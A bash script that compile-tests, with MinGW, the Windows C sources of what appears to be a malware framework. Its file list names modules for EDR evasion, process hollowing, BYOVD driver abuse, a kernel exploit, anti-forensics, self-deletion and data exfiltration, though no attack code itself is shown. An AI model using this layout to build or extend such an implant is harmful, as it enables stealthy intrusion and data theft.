#!/bin/bash
# Test Windows runtime C files for MinGW compilation

set -e

RUNTIME_DIR="/home/incharanew/JOCKY/src/runtime"
INCLUDE_DIR="$RUNTIME_DIR/include"
WINDOWS_DIR="$RUNTIME_DIR/windows"
RESULTS_FILE="/tmp/compile_results.txt"
ERRORS_FILE="/tmp/compile_errors.txt"

# Clear result files
> "$RESULTS_FILE"
> "$ERRORS_FILE"

# Check if mingw is available
if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "MinGW not available on this system - skipping Windows compilation tests"
    exit 0
fi

echo "Testing Windows runtime files with MinGW..."
echo ""

# Files to test (from compile_pipeline.py)
declare -a FILES=(
    "$RUNTIME_DIR/init/anti_analysis.c"
    "$RUNTIME_DIR/util/mem.c"
    "$RUNTIME_DIR/exfil/exfil.c"
    "$RUNTIME_DIR/ai/mutation_engine.c"
    "$RUNTIME_DIR/core/plugin.c"
    "$RUNTIME_DIR/core/sandbox.c"
    "$WINDOWS_DIR/evasion/unhook.c"
    "$WINDOWS_DIR/evasion/syscalls.c"
    "$WINDOWS_DIR/evasion/stack_spoof.c"
    "$WINDOWS_DIR/evasion/blindside.c"
    "$WINDOWS_DIR/evasion/edrhoker.c"
    "$WINDOWS_DIR/execution/hollow.c"
    "$WINDOWS_DIR/execution/byovd.c"
    "$WINDOWS_DIR/execution/inmem.c"
    "$WINDOWS_DIR/execution/driver_interact.c"
    "$WINDOWS_DIR/exploitation/kernel_exploit.c"
    "$WINDOWS_DIR/byovd/btr_abuse.c"
    "$WINDOWS_DIR/byovd/byovd_modular.c"
    "$WINDOWS_DIR/registry/registry.c"
    "$WINDOWS_DIR/audit/audit.c"
    "$WINDOWS_DIR/anti_forensics/forensics.c"
    "$WINDOWS_DIR/anti_forensics/logs.c"
    "$WINDOWS_DIR/anti_forensics/self_delete.c"
    "$WINDOWS_DIR/security/token_manipulation.c"
    "$WINDOWS_DIR/exfil/enhanced_exfiltration.c"
)

PASSED=0
FAILED=0

for file in "${FILES[@]}"; do
    filename=$(basename "$file")
    parentdir=$(basename $(dirname "$file"))

    if [ ! -f "$file" ]; then
        echo "SKIP: $filename (not found)"
        echo "SKIP: $parentdir/$filename (not found)" >> "$RESULTS_FILE"
        continue
    fi

    output=$(mktemp)
    if x86_64-w64-mingw32-gcc -c "$file" \
        -I "$INCLUDE_DIR" \
        -I "$(dirname "$file")" \
        -I "$RUNTIME_DIR" \
        -I "$WINDOWS_DIR" \
        -D_WIN32_WINNT=0x0600 -DUNICODE -D_UNICODE \
        -O2 -Wall -Wextra \
        -o /tmp/test.o 2>"$output"; then
        echo "PASS: $parentdir/$filename"
        echo "PASS: $parentdir/$filename" >> "$RESULTS_FILE"
        ((PASSED++))
    else
        echo "FAIL: $parentdir/$filename"
        echo "FAIL: $parentdir/$filename" >> "$RESULTS_FILE"
        head -5 "$output" >> "$ERRORS_FILE"
        echo "---" >> "$ERRORS_FILE"
        ((FAILED++))
    fi
    rm -f "$output" /tmp/test.o
done

echo ""
echo "=========================================="
echo "Compilation Results:"
echo "  PASSED: $PASSED"
echo "  FAILED: $FAILED"
echo "=========================================="

if [ $FAILED -gt 0 ]; then
    echo ""
    echo "Errors:"
    cat "$ERRORS_FILE"
fi

exit $FAILED
